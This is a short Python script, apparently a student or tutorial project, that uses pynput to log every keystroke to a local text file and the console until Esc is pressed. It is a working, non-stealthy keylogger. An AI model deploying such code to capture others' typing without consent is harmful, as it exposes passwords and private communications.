# importing the necessary modules for the pynput library
import pynput
from pynput.keyboard import Key, Listener

# initializing an empty list to store keystrokes
keys = []

# function to call when key is pressed
def on_press(key):
    # append the pressed key to the list
    keys.append(key)

    # call function to write the keys to a file
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('Project_7.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'","")
            f.write(k)
            f.write(' ')


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False
    

with Listener(on_press = on_press, on_release=on_release) as listener:
    listener.join()